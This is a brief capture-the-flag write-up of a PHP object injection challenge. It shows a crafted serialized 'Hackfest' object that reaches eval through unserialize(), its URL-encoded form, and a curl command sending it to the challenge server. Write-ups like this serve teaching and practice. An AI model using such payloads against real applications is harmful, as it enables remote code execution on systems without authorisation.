
PHP object Injection via unserialize :
We are greeted with a php code source and a web page where we can request a $_GET['msg'] message /
after analysing the code source i concluded that i need to exucte the print_flag() function , so we need to eval('print_flag();');
even that we have acess to the magic _toString() funtion , we can't access to the priavte $hook attribute .so here is the vulnerability .

For those who have no idea about unserialize() vulnerabilities:
Serialization vulnerabilities are not just native to PHP. These vulnerabilities exist in different languages under different names. For example, we’ve heard a lot about Java deserialization vulnerabilities which can lead to code execution. Similar vulnerabilities exist in Python module pickle which can lead to code execution while unpickling the data.

So i just get the payload from owasp exemple n 2 :
https://www.owasp.org/index.php/PHP_Object_Injection
data=O:8:"Example2":1:{s:14:"Example2 hook";s:10:"phpinfo();";} 
and i just changed some parameters in the hackfest serilazed object, such as stirng lengths to conforme it with our inital php code :
msg=O:8:"Hackfest":1:{s:14:"Hackfest hook";s:13:"print_flag();";} 
with some url encode : msg=O%3A8%3A%22Hackfest%22%3A1%3A%7Bs%3A14%3A%22Hackfest%20hook%22%3Bs%3A13%3A%22print_flag()%3B%22%3B%7D%20
easy just  curl http://challenge.hackfest.tn:8080?msg=O%3A8%3A%22Hackfest%22%3A1%3A%7Bs%3A14%3A%22Hackfest%20hook%22%3Bs%3A13%3A%22print_flag()%3B%22%3B%7D%20 | grep 'hackfest'
